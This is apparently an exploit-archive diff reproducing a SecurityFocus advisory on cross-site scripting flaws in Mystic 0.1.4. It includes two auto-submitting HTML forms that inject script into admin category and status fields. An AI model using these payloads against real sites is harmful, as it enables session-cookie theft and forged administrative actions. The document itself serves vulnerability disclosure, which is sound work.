@@ -1,0 +1,28 @@
+source: http://www.securityfocus.com/bid/42445/info
+
+Mystic is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.
+
+Mystic 0.1.4 is vulnerable; other versions may also be affected. 
+
+<form action="http://www.example.com/admin/create_new_category" method="post" name="main" >
+<input type="hidden" name="category[id]" value="999" >
+<input type="hidden" name="category[name]" value='mynewcat"><script>alert(document.cookie)</script>' />
+<input type="hidden" name="commit" value="Create New Category!" >
+</form>
+<script>
+document.main.submit();
+</script>
+
+
+
+<form action="http://www.example.com/admin/create_new_status" method="post"  name="main" >
+> <input type="hidden" name="status[id]" value="999" >
+> <input type="hidden" name="status[name]" value='status name"><script>alert(document.cookie)</script>' >
+> <input type="hidden" name="commit" value="Create New Status!" >
+> </form>
+> <script>
+> document.main.submit();
+> </script>
+> 
